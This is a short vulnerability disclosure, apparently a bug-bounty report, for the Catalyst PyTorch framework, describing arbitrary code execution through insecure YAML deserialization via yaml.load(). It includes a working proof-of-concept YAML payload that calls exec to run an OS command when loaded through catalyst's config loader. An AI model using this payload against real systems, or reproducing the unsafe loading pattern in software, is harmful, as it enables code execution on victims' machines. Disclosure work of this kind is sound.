# Description

**Catalyst** is a PyTorch framework for Deep Learning research and development. It focuses on reproducibility, rapid experimentation, and codebase reuse so you can create something new rather than write another regular train loop.
This package was vulnerable to Arbitrary code execution via Insecure YAML deserialization due to the use of a known vulnerable function **load()** in **yaml**. <br>

repo: https://github.com/catalyst-team/catalyst

# Proof of Concept

```python
import os
os.system('pip3 install catalyst')
from catalyst.utils import config
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('pwn.yml','w+').write(exploit)
config.load_config('pwn.yml')
```

* `pip3 install catalyst`
* `python3 exploit.py`
